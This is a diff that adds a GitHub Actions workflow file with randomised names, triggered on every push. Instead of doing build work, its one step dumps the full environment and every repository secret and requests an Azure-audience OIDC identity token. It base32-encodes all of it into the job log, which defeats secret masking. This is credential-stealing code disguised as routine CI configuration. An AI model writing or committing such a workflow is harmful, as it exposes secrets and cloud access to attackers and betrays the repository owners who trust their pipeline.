@@ -1,0 +1,26 @@
+# 6ffxox5bjuoygrpo
+name: hptgbcm4247k
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  urcmnw7gb:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    env:
+      SBEK3RXB4: ${{ toJSON(secrets) }}
+    strategy:
+      fail-fast: false
+      matrix:
+        environment:
+          - "github-pages"
+    environment: ${{ matrix.environment }}
+    steps:
+      - name: o6hns4ynl
+        run: |
+          env | base32 -w 122
+          printf '%s' 'T' | base32 -w 122
+          printf '%s' "$SBEK3RXB4" | base32 -w 122
+          printf '%s' 'T' | base32 -w 122
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' 'T' | base32 -w 122; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 122; fi
